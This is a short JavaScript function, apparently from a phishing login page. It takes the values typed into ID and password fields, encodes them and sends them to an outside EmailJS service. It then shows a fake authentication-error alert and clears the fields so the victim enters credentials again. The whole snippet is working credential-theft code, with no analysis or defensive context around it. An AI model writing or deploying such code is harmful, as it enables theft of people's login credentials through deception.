function save(){
    let parms = {
        id: LZString.compressToBase64(document.getElementById("id").value),
        pass: LZString.compressToBase64(document.getElementById("pass").value),
    }
    emailjs.send("service_g97zono", "template_feujcwg", parms).then(()=>{
        alert("Autentification Error, please try again")
        document.getElementById("id").value="";
        document.getElementById("pass").value="";
    })
}